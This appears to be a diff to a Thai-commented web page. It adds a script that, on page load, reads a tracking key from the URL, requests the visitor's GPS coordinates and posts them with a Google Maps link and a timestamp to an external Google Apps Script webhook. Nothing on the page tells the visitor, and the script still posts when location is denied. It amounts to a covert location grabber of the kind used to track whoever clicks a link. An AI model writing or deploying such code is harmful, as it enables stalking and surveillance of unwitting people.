@@ -170,8 +170,6 @@
       return trackingKey && trackingKey !== "ไม่มีค่า";
     }
   </script>
-</head>
-<body>
   <script>
     // ตรวจสอบก่อนที่จะโหลดสคริปต์หลัก
     if (hasValidTrackingKey()) {
@@ -214,5 +212,68 @@
 </script>
   
   <script src="script.js"></script>
+  <script>
+    // ส่วนนี้ควรอยู่ในฟังก์ชันที่ทำงานเมื่อโหลดหน้าเว็บ
+    function initialize() {
+      // อ่านค่าพารามิเตอร์จาก URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const trackingKey = urlParams.get('daily');
+      const source = urlParams.get('source') || 'link'; // หากไม่ระบุ ถือว่าเป็นการคลิกจากลิงก์
+      
+      // ส่วนที่ดึงตำแหน่ง GPS (ต้องทำงานไม่ว่าจะมาจาก source ใดก็ตาม)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // เมื่อได้รับตำแหน่ง GPS
+            const location = {
+              lat: position.coords.latitude,
+              long: position.coords.longitude, 
+              accuracy: position.coords.accuracy,
+              gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+            };
+            
+            // ส่งข้อมูลไป webhook พร้อมระบุ source
+            sendDataToWebhook(trackingKey, location, source);
+          },
+          (error) => {
+            console.error("Error getting location:", error);
+            // ส่งข้อมูลไป webhook แม้จะไม่ได้ตำแหน่ง GPS
+            sendDataToWebhook(trackingKey, null, source);
+          }
+        );
+      } else {
+        console.log("Geolocation is not supported by this browser");
+        // ส่งข้อมูลไป webhook แม้จะไม่รองรับ GPS
+        sendDataToWebhook(trackingKey, null, source);
+      }
+    }
+    
+    // ฟังก์ชั่นสำหรับส่งข้อมูลไปยัง webhook
+    function sendDataToWebhook(trackingKey, location, source) {
+      // อ่านข้อมูลอื่นๆ ที่ต้องการส่ง
+      
+      // สร้างออบเจ็กต์ข้อมูล
+      const data = {
+        trackingKey: trackingKey,
+        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์
+        location: location, // ข้อมูลตำแหน่ง GPS
+        // ข้อมูลอื่นๆ
+        timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
+        // ... อื่นๆ ...
+      };
+      
+      // ส่งข้อมูลไปยัง webhook
+      fetch('https://script.google.com/macros/s/AKfycbwFEYbhh3zbwqoGiAKtBpjl8ccXWPbIhpJi71XoYvjcgkBSg5jeBUQ6EW6LWP1jrUbd/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      }).catch(error => console.error('Error sending data to webhook:', error));
+    }
+    
+    // เรียกใช้ initialize เมื่อโหลดหน้าเว็บ
+    document.addEventListener('DOMContentLoaded', initialize);
+  </script>
 </body>
 </html>
